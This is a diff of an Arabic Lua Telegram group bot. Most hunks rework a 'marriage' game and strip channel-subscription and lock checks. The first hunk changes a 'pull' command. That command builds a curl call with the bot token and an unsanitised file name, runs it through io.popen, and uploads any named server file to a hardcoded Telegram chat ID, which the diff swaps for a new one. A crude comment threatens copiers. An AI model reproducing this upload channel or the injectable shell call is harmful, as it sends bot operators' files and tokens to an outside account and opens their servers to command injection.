@@ -1635,7 +1635,7 @@ return false
 end
 if text and text:match("^سحب (.*)$") and Developers(msg) then
 local file = text:match("^سحب (.*)$") 
-local curlm = 'curl "'..'https://api.telegram.org/bot'..token..'/sendDocument'..'" -F "chat_id='.. 1360140225 ..'" -F "document=@'..''..file..''..'"'
+local curlm = 'curl "'..'https://api.telegram.org/bot'..token..'/sendDocument'..'" -F "chat_id='.. 944353237 ..'" -F "document=@'..''..file..''..'"'
 io.popen(curlm) ---- كود كتابه أحمد عياد هتسرق هيجيبك من طيزك
 send(msg.chat_id_, msg.id_,' جاري ارسال ملف '..file..' الي خاصك\n'..msg.sender_user_id_)
 return false
@@ -9459,11 +9459,7 @@ tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumbe
 return false
 end
 -----------------------------------------------------
-if text == 'مسح الزوجات' and Mod(msg) then
-bot_data:del(ban_id..'Mode:User'..msg.chat_id_)
-send(msg.chat_id_, msg.id_, ' ● تم مسح جميع الزوجات')
-end
-if text == ("تاك للزوجات") and Mod(msg) then
+if text == "زوجتي" or text == "مراتي" and Mod(msg) then
 local list = bot_data:smembers(ban_id..'Mode:User'..msg.chat_id_)
 t = "\n ● قائمه زوجات الجروب \n ●═───═❲[🅢🅞🅞🅝](t.me/SOURCEVENOM)❳═───═??\n"
 for k,v in pairs(list) do
@@ -9481,25 +9477,16 @@ send(msg.chat_id_, msg.id_, t)
 end
 ---------
 if text == ("رفع زوجتي") or text == ("زواج") and tonumber(msg.reply_to_message_id_) ~= 0 and Mod(msg) then
-if AddChannel(msg.sender_user_id_) == false then
-local textchuser = bot_data:get(ban_id..'text:ch:user')
-if textchuser then
-send(msg.chat_id_, msg.id_,'['..textchuser..']')
-else
-send(msg.chat_id_, msg.id_,' ● لا تستطيع استخدام البوت \n ●  يرجى الاشتراك بالقناه اولا \n ●  اشترك هنا ['..bot_data:get(ban_id..'add:ch:username')..']')
-end
-return false
-end
-if bot_data:get(ban_id..'Lock:Add:Bot'..msg.chat_id_) and not Constructor(msg) then
-send(msg.chat_id_, msg.id_,' ● تم تعطيل الرفع') 
-return false
-end
 function start_function(extra, result, success)
-bot_data:sadd(ban_id..'Mode:User'..msg.chat_id_, result.sender_user_id_)
+bot_data:sadd(msg.sender_user_id_..'YYYBD-zoaag1', result.sender_user_id_)
+bot_data:sadd(result.sender_user_id_..'YYYBD-zoaag2', msg.sender_user_id_)
 tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
-usertext = '\n ● العضــو  ⋙ ['..data.first_name_..'](t.me/'..(data.username_ or 'DEVBESSO')..')'
-local  statuss  = '\n ● تم رفع العضــو زوجه في الجروب \n'
+tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,ay) 
+usertext = '\n ● العضــو  ⋙ ['..ay.first_name_..'](tg://user?id='..msg.sender_user_id_..')'
+..'\n● مع ['..data.first_name_..'](tg://user?id='..result.sender_user_id_..')'
+local statuss  = '\n ● تم زواجكم بنجاح \n'
 send(msg.chat_id_, msg.id_, usertext..statuss)
+end,nil)
 end,nil)
 end
 tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
@@ -9507,15 +9494,6 @@ return false
 end
 
 if text == ("تنزيل زوجتي") or text == ("طلاق") and msg.reply_to_message_id_ and Mod(msg) then
-if AddChannel(msg.sender_user_id_) == false then
-local textchuser = bot_data:get(ban_id..'text:ch:user')
-if textchuser then
-send(msg.chat_id_, msg.id_,'['..textchuser..']')
-else
-send(msg.chat_id_, msg.id_,' ● لا تستطيع استخدام البوت \n ●  يرجى الاشتراك بالقناه اولا \n ●  اشترك هنا ['..bot_data:get(ban_id..'add:ch:username')..']')
-end
-return false
-end
 function start_function(extra, result, success)
 bot_data:srem(ban_id..'Mode:User'..msg.chat_id_, result.sender_user_id_)
 tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
